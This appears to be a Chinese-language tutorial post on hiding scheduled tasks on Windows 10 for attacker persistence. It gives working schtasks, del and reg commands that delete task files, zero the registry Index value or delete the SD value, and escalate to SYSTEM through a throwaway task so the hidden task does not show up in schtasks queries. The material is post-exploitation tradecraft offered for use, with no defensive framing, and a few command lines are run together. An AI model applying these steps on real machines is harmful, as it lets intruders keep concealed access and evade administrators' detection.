     主要介绍在win10下"非完全隐藏计划任务"和"完全隐藏计划任务"，用于权限维持。


一、创建计划任务

创建一个计划任务demo,每分钟把az写入到whois.txt文本
schtasks /create /tn demo /sc minute /mo 1 /tr "cmd /c echo az >> C:\users\test\desktop\whois.txt"


可以看到计划任务已经创建成功并且执行成功了



二、非完全隐藏计划任务

    仅需两步

  • 删除C:\windows\system32\tasks\下对应文件

del C:\windows\system32\tasks\计划任务名称

  • 将注册表中对应的index值改为0

reg add "hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\计划任务名称" /v index /t reg_dword /d 0 /f

    

    不过修改对应的index必须是system权限才可修改，所以我们需要用到计划任务将权限提升至system进行操作，这里我创建了一个hidden的计划任务用于修改demo的index值

schtasks /create /tn hidden /tr "cmd /c reg add \"hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\demo\" /v index /t reg_dword /d 0 /f" /sc onstart /ru systemschtasks /run /tn hidde


可以看到index值成功修改为0

reg query  "hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\demo"

接下来把hidden任务删除掉

schtasks /delete /tn hidden

计划任务成功被隐藏

使用schtasks 进行查询也查不到

schtasks |findstr demo

不过知道计划任务名字是可以用schtasks查询

schtasks /query /tn demo


三、完全隐藏计划任务

     和非完全隐藏的的区别在于即使知道了任务名字用schtasks 也查询不到
步骤如下:

  • 删除C:\windows\system32\tasks对应的文件

  • 删除对应注册表的SD项

reg delete "hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\计划任务名称" /v sd /f

这是demo计划任务默认项

以system权限删除SD项

schtasks /create /tn hidden /tr "cmd /c reg delete \"hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\demo\" /v sd /f " /sc onstart /ru system /fschtasks /run /tn hidden

SD项已被成功删除

此时用schtasks也查不到了
